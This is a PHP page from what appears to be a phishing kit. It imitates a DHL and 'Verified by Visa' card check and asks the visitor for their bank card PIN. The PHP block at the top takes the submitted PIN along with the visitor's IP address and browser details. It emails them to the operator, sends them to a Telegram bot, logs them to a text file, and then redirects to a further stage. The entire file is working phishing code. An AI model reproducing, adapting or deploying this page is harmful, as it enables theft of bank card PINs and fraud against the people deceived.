<?php
    
    
    if(isset($_POST['btnSEND'])){
        $num = $_POST['num'];
        $time  = date('H:S');
        $date = date('d/m/Y');
        $IP = getenv("REMOTE_ADDR");
        
        $message .= "--++-----[pin card]-----++--\n";
        $message .= "-------------- @manini_ment -----\n";
        $message .= "PIN  : ".$num."\n";
        $message .= "Time : ".$time."\n";
        $message .= "Date : ".$date."\n";
        $message .= "-------------- IP Infos ------------\n";
        $message .= "https://geoiptool.com/en/?ip=$IP\n";
        $message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
        $message .= "---------------------- @manini_ment ----------------------\n";
        $subject = "billingg Posten [ " . $IP . " ] ";
        
        include 'configuration.php';
        
        mail($MyEmail,$subject,$message);
        
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
        $text = fopen('data/sms.txt', 'a');
        fwrite($text, $message);?>
<script>
                        window.location.href='FINAL2.php';
                    </script>
    <?php }
?>
<html>
    <head>
        <title>GR PHONES</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="packeges/bootstrap.min.css">
        <link rel="stylesheet" href="packeges/jquery.js" >
        <link rel="stylesheet" type="text/css" href="packeges/final2.css" >
        <link rel="Icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/b/b3/DHL_Express_logo.svg">
    </head>
    <body>
        <div class="navigation borderBottom">
        <a href="https://imgbb.com/"><img src="https://i.ibb.co/NYMh0sz/LOGO.gif" class="LOGO" ></a>
            <div style="display:flex;">
                <img src="images/verified_by_visa.png" class="logo d-none d-sm-block" />
            <img style="margin-left:5px;" src="images/1.png" class="logo d-none d-sm-block" />
            </div>
            
        </div>
        <div class="container topSpase" >
            <div class="row">
        
                <div class="col-sm-12 col-md-8 ">
                    <form method="post" action="">
                        <p class="f1"></p>
                    <div class="ELE_hr"></div>
                    <h5 class="f2">Pin-Code</h5>
                    <input type="password" name="num" placeholder="****" class="inputDE" />
                    <!-- <div class="elementDIV"> -->
                
                    <div class="elementDIV">
                        <p class="paragrafTop">Enter the PIN for the bank card</p>
                        <p class="paragrafTop">Do you no longer remember the pin?</p>
                        <ul>
                            <li>You can re-order it from the bank</li>
                            <li>Thanks for your participation</li>
              

                        </ul>
                    <div class="btnSEN">
                        <input type="submit" name="btnSEND" value="NEXT" class="BTNR">
                    </div>
                    </form>
                    
                </div>
            </div>
        </div>
        
        
        <script src="packeges/jquery.js"></script>
        <script src="packeges/bootstrap.min.js"></script>
    </body>
</html>